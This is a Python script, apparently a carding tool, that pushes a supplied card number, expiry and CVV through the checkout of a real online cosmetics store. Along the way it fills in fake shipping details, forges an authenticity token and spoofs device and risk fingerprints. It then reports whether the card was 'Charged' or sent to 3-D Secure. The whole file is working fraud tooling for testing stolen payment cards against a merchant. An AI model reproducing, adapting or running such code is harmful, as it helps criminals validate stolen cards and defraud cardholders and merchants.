from all.configs._def_main_ import *

@retry(stop=stop_after_attempt(3))
async def auto_sho_async(cc, mes, ano, cvv):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)


    async with aiohttp.ClientSession(connector=conn) as session:

        payload_1 = {
            'id': '43273662660773'
        }

        req1 = await session.post(url=f'https://www.sheglam.com/es/cart/add', data=payload_1, timeout=aiohttp.ClientTimeout(total=5))

        req3 = await session.get(url=f"https://www.sheglam.com/checkout", timeout=aiohttp.ClientTimeout(total=5))

        checkout_url = req3.url

        print(Fore.GREEN +
              f"[ ꑭ ] URL CHECKOUT: {checkout_url}" + Fore.RESET)

        authenticity_token = get_random_string(86)

        headers = {

            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'

        }

        payload_2 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=jorgean78yobio%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Battributes%5D%5BCPF+Number%5D=&checkout%5Bshipping_address%5D%5Bfirst_name%5D=jorge&checkout%5Bshipping_address%5D%5Blast_name%5D=alberto&checkout%5Bshipping_address%5D%5Baddress1%5D=The+Allen+Hotel&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10002&checkout%5Bshipping_address%5D%5Bphone%5D=2516782912&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1303&checkout%5Bclient_details%5D%5Bbrowser_height%5D=658&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360&checkout%5Battributes%5D%5BdeviceCode%5D=%7B%22billno%22%3A%22%22%2C%22scene%22%3A%222%22%2C%22siteFrom%22%3A%22sheglam%22%2C%22siteName%22%3A%22SHEGLAM%22%2C%22siteId%22%3A%2230%22%2C%22deviceCodes%22%3A%7B%22cookie_id%22%3A%22ca9b8ab1-e537-49af-ab55-520ce98507af%22%2C%22fbp%22%3A%22fb.1.1714358952798.1719591374%22%7D%7D'
        
        req4 = await session.post(url=checkout_url, headers=headers, data=payload_2, timeout=aiohttp.ClientTimeout(total=5))

        payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520Shipping-4.59&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1318&checkout%5Bclient_details%5D%5Bbrowser_height%5D=658&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360&checkout%5Battributes%5D%5BdeviceCode%5D=%7B%22billno%22%3A%22%22%2C%22scene%22%3A%222%22%2C%22siteFrom%22%3A%22sheglam%22%2C%22siteName%22%3A%22SHEGLAM%22%2C%22siteId%22%3A%2230%22%2C%22deviceCodes%22%3A%7B%22cookie_id%22%3A%22ca9b8ab1-e537-49af-ab55-520ce98507af%22%2C%22fbp%22%3A%22fb.1.1714358952798.1719591374%22%7D%7D'
        
        req5 = await session.post(url=checkout_url, headers=headers, data=payload_3, timeout=aiohttp.ClientTimeout(total=5))

        payload_4 = {
            "credit_card": {
                "number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}",
                "name": "Sylphiette Idk",
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            "payment_session_scope": "www.sheglam.com"
        }

        req6 = await session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4, timeout=aiohttp.ClientTimeout(total=5))

        token = await req6.json()

        id_ = token.get('id')

        print(Fore.GREEN +
              f"[ ꑭ ] TOKEN ID: {id_}" + Fore.RESET)

        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=75261280421&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=934&checkout_submitted_request_url=https%3A%2F%2Fwww.sheglam.com%2F45383057573%2Fcheckouts%2Fb8a77cb4c6602f0f9802c24b44ba283f%3Fprevious_step%3Dshipping_method%26step%3Dpayment_method&checkout_submitted_page_id=27d10844-000F-436D-8DE6-3CBEDE89AC11&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1303&checkout%5Bclient_details%5D%5Bbrowser_height%5D=658&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360&checkout%5Battributes%5D%5BdeviceCode%5D=%7B%22billno%22%3A%22%22%2C%22scene%22%3A%222%22%2C%22siteFrom%22%3A%22sheglam%22%2C%22siteName%22%3A%22SHEGLAM%22%2C%22siteId%22%3A%2230%22%2C%22deviceCodes%22%3A%7B%22cookie_id%22%3A%22ca9b8ab1-e537-49af-ab55-520ce98507af%22%2C%22fbp%22%3A%22fb.1.1714358952798.1719591374%22%7D%7D&checkout%5Battributes%5D%5BriskInfo%5D=%7B%22sm_device_id%22%3A%22Wlsel6H6wYo2yxiPaNVwByCSQp9VzfjCjqEL9xJ%2FHrLp1aeEpbdeSNA4%2B24CFfOv%2FPVkXxWAL57%2FGe09z%2FY2cvVW1Ney%2Flx%2Fz5I2B%2FANwPe97gNLSmINqJEJ1DP%2BvzSdFamrs87e4r4rs6sCZUBFYrz9lM%2FsxYZSSkI20qmzK0YmgUrxybS4cgI0U0hhX7pudWfYmHDK2cYdyLVOFKnIcZULhK8cXuVor3D3kZtKgpfCE2qUAgue4i1sr4TmbHEQBhZvSd9cpz1I%3D1487577677129%22%2C%22anti_in%22%3A%220_1.1.0-shopify_212a05_GNtCitV_GQiymLfNghJQwZjVMnBHaOMZXYmEoAo0cnCdb9X1ff0E6q5q09BM6zZU_DeiUX9zoLX2kN8YDoR8ukeevWgFjHY7DxUpEIJCnd76lUHVnuHHtol0IH8BzrnH889B7mUC5p3KIVu7aJkm9IKmNMU-eTZTwEwSdqw1kHz8Mx2lXGSP0k27WR66xX_9H38Hu-qk8jW6iSyolcFDZJLqxOSQxQI4sgF81FWaC7iGH6YHCbr3FfOb5JK6KMo-_n1_qhHpFA6B41nyE0D1aa3CekzEy6_yjQwX69Su_aRxFrvbcVc2RAjhOraMViHQuBAwvFIBA20gXLdp4xnD6P1AqOMzSRu9GD7fyN9rOTPHS94rqj8yVq48vHdvdYVyMz6D0wsaSS_wPAtoLr-Bdy7JjNewiQiAkzAoRUn_pT_BUladiYRr2AqkGWCfDdIyncYoAzKBDg0o6wSSV4eQbnngcnQiuIYJ08aET63Secp0DRs4Eu2iuy2D6MLOfErIwocohPfLVFT98wn5XLaezoH4ZQZogDOhjZYRQzloReocsWoW1WhePegtVpgDbRDKG-MgCRL_rlQXFEXwgxeR-PMrzBQ-Y5aqnm-ApKxFY6l7FSfsSBvgYf_tKaSdPhRf2MVQDa8ULG57pOvuJ_u5_1YWCCJnvDtmjku8tPtp6tV37bIpi3PjLiPcjaGyl6z2mGBrTCqhJNB0qQoRIRzJU-0afljIn8gJh9m54CElqCtXHIRrZ5eZkEGJJwzyORnXUFsi8IlknzNiEYY_I1ABZw%22%2C%22channel%22%3A0%2C%22browser_mode%22%3A%22Microsoft+Edge%22%2C%22browser_versions%22%3A%22124.0.0.0%22%2C%22device_system_version%22%3A%22Windows+10%22%2C%22risk_id%22%3A%221d35530a-a655-4d16-94ec-e1807daa0e3e%22%2C%22biz_id%22%3A%22shopify-sheglam301714359981393XjwmjS%22%7D'
        
        req7 = await session.post(url=checkout_url, headers=headers, data=payload_5, timeout=aiohttp.ClientTimeout(total=8))

        await asyncio.sleep(5)

        processing_url = req7.url

        print(Fore.GREEN +
              f"[ ꑭ ] URL PROCESADA: {processing_url}" + Fore.RESET)

        req8 = await session.get(str(processing_url) + '?from_processing_page=1', timeout=aiohttp.ClientTimeout(total=5))

        await asyncio.sleep(5)

        req9 = await session.get(req8.url, timeout=aiohttp.ClientTimeout(total=5))

        text_resp = await req9.text()

        resp = find_between(text_resp, 'notice__text">', '<')

        if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):

            resp = 'Charged'

        elif '/3d_secure_2/' in str(req9.url):

            resp = '3d_secure_2'

        print(resp)

        return resp